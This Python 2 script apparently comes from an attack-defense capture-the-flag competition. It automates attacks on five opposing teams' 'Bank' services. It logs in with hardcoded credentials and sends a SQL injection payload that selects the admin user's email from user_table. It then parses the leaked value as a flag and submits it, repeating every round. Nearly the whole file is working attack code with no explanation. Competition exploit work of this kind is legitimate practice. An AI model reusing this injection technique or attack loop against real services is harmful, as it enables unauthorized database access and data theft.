import sys
import urllib2
import time
import requests
from pwnbox.pipe import SocketPipe
from submit import send

MYTEAM = 'Team 3'
DST = ['Team 1', 'Team 2', 'Team 4', 'Team 5', 'Team TA']
url = [1, 2, 4, 5, 6]

def check_rnd():
    r = requests.get('http://localhost:3000/')
    rnd = r.text.split('Round : ')[1].split(' </h1>')[0]
    return rnd

def attack_Bank():
    SERVICE = 'Bank'
    succ = []

    for i in range(5):
        print i
        s = SocketPipe('localhost', 10000 + url[i])
        s.read_some()
        s.write_line('1')
        s.read_some()
        s.read_some()
        s.write_line('pr0v3rbs')
        s.read_some()
        s.read_some()
        s.write_line('**censored**')
        s.read_some()
        s.read_some()
        s.write_line('3')
        s.read_some()
        s.read_some()
        s.write_line('admin')
        s.read_some()
        s.read_some()
        s.write_line('1')
        s.read_some()
        s.read_some()
        s.write_line("', (select email from user_table where user_id like 'admin'), '")
        s.read_some()
        s.read_some()
        s.write_line('Y')
        s.read_some()
        s.read_some()
        s.write_line('')
        s.read_some()
        s.read_some()
        s.write_line('2')
        x = s.read_some()
        time.sleep(0.5)
        x += s.read_some()
        flag = x.split('[Transfer] ')[1].split(' |')[0]
        s.close()
        print flag
        if send('Team 3', DST[i], SERVICE, flag):
            succ.append(i)
        time.sleep(0.5)

    return succ

old = 0
while True:
    new = check_rnd()
    if old != new:
        old = new
        print 'rnd : ', new
        print 'attack Bank start'
        succ = attack_Bank()
        numtry = 1
        while len(succ) != 5 and numtry < 5:
            succ = attack_Bank()
            time.sleep(10)
            numtry += 1

        print 'ok at : ',
        for i in succ:
            print DST[i],
        print
    time.sleep(5)
